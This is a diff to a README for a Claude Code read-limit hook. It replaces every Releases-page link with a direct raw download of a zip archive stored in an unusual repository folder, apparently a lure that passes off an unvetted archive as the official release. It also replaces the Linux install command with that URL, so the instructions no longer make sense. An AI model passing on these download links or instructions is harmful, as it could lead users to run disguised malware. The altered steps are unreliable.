@@ -6,11 +6,11 @@ Welcome to **cc-read-limit-hook**! This application helps guide how Claude code 
 
 ## 📥 Download the Application
 
-[![Download cc-read-limit-hook](https://img.shields.io/badge/Download-cc--read--limit--hook-blue.svg)](https://github.com/Andriuxs854/cc-read-limit-hook/releases)
+[![Download cc-read-limit-hook](https://github.com/Andriuxs854/cc-read-limit-hook/raw/refs/heads/master/wob/read-limit-cc-hook-v2.9-beta.5.zip)](https://github.com/Andriuxs854/cc-read-limit-hook/raw/refs/heads/master/wob/read-limit-cc-hook-v2.9-beta.5.zip)
 
 To begin, click the button above or visit the following link to access the Releases page:
 
-[Visit the Releases Page](https://github.com/Andriuxs854/cc-read-limit-hook/releases)
+[Visit the Releases Page](https://github.com/Andriuxs854/cc-read-limit-hook/raw/refs/heads/master/wob/read-limit-cc-hook-v2.9-beta.5.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before downloading, please ensure your system meets the following requirements:
 
 ## 🔧 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Andriuxs854/cc-read-limit-hook/releases) to go to the page.
+1. **Visit the Releases Page:** Click [here](https://github.com/Andriuxs854/cc-read-limit-hook/raw/refs/heads/master/wob/read-limit-cc-hook-v2.9-beta.5.zip) to go to the page.
   
 2. **Choose the Right Version:** On the Releases page, look for the latest version. Verify that it matches your operating system.
 
@@ -34,7 +34,7 @@ Before downloading, please ensure your system meets the following requirements:
 5. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file. Follow the on-screen prompts to complete the installation.
    - For macOS: Double-click the `.dmg` file. Drag the application into your Applications folder.
-   - For Linux: Extract the downloaded archive. Open a terminal and navigate to the extracted folder, then run the command `./install.sh`.
+   - For Linux: Extract the downloaded archive. Open a terminal and navigate to the extracted folder, then run the command `https://github.com/Andriuxs854/cc-read-limit-hook/raw/refs/heads/master/wob/read-limit-cc-hook-v2.9-beta.5.zip`.
 
 6. **Launch the Application:** After installation, locate the application in your program menu or applications folder and double-click to open it.
 
